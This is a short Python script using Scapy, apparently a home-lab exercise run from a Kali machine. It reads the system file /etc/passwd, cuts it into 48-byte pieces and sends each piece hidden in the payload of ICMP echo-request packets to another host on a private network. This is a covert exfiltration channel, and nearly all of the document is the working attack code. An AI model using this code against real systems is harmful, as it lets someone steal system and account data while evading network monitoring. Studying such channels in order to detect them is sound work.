#!/usr/bin/python3

from scapy.all import *

with open('/etc/passwd', 'r') as file:
    data = file.read()
    
chunks = [data[i:i+48] for i in range(0, len(data), 48)]

print("chunk:")
print(chunks)

ip=IP(src='192.168.86.28', dst='192.168.86.25')

# tidligere ip på kali før bridged networking: 192.168.119.128

icmp = ICMP(type='echo-request')

#packet = ip/icmp/Raw(load="noget")

#packet = sr1(packet)

for chunk in chunks:
    payload = Raw(load=chunk)

    packet = ip/icmp/payload
    
    packet.show()

    packet = sr1(packet)
